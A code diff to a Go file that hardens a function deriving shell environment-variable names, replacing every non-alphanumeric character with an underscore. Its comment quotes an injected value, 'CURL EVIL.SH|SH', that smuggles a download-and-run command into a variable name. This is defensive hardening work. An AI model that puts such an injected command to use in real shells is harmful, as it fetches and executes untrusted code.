@@ -89,9 +89,42 @@ func ProfileEnvVar(profile, input string) string {
 	return "RTA_PROFILE_" + envToken(profile) + "_" + envToken(input)
 }
 
-// envToken renders one segment of a derived variable name.
+// envToken renders one segment of a derived variable name, and guarantees the
+// result is a shell identifier whatever it was given.
+//
+// **Every caller's input is already validated, and that is exactly why this
+// filters anyway.** A plugin's name and its inputs match `^[a-z][a-z0-9-]*$`
+// at registration and a profile's name matches `^[a-z0-9][a-z0-9-]{0,62}$`
+// before it is written — so on every value this function is supposed to see,
+// the filter changes nothing. The one that reached it anyway came from a
+// config file somebody edited by hand, which the loader marks invalid and the
+// profiles pane prints in red, and rta still built `RTA_PROFILE_A; CURL
+// EVIL.SH|SH #_TOKEN` out of it and offered it as a line to paste into a
+// shell.
+//
+// The lesson is not about that one path. An identifier derived from a string
+// is only as safe as whichever validator happened to run first, in another
+// package, at another time — so the guarantee belongs here, where the name is
+// made. builtin/kv reached the same conclusion for `kv env` and wrote its own
+// filter; this is that filter, at the other place names are derived.
+// A dash becomes an underscore because that is the documented spelling —
+// `RTA_PG_SSL_MODE` for `ssl-mode` — and everything else becomes one too,
+// because a name that has to be mangled has already failed validation and the
+// only thing left to get right is that it cannot be read as syntax.
+//
+// No leading-digit guard, unlike builtin/kv's: every caller prefixes a
+// constant (`RTA_`, `RTA_PROFILE_`), so a token is never the first character
+// of the identifier it lands in.
 func envToken(s string) string {
-	return strings.ToUpper(strings.ReplaceAll(s, "-", "_"))
+	var sb strings.Builder
+	for _, r := range strings.ToUpper(s) {
+		if (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') {
+			sb.WriteRune(r)
+			continue
+		}
+		sb.WriteRune('_')
+	}
+	return sb.String()
 }
 
 // Namespace is the plugin part of a capability ID: "kv" of "kv.get".
